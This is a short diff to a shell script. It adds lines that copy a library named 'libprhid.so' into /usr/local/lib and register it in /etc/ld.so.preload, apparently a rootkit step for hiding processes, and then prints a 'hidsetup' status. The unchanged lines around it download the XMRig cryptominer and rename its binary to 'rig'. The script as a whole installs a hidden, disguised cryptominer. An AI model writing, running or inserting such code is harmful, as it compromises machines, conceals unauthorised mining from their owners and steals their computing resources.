@@ -1,3 +1,12 @@
+
+cp libprhid.so /usr/local/lib/
+echo /usr/local/lib/libprhid.so >> /etc/ld.so.preload
+
+if [[ -f libprhid.so || -f /etc/ld.so.preload ]] ;
+	then printf "%-20s %20s\n" " hidsetup" "[  DONE  ]" ;
+else printf "%-20s %20s\n" " hidsetup" "[  FAILED  ]" ;
+fi
+
 wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz
 tar -xvf xmrig-6.20.0-linux-static-x64.tar.gz
 mv xmrig-6.20.0/xmrig xmrig-6.20.0/rig
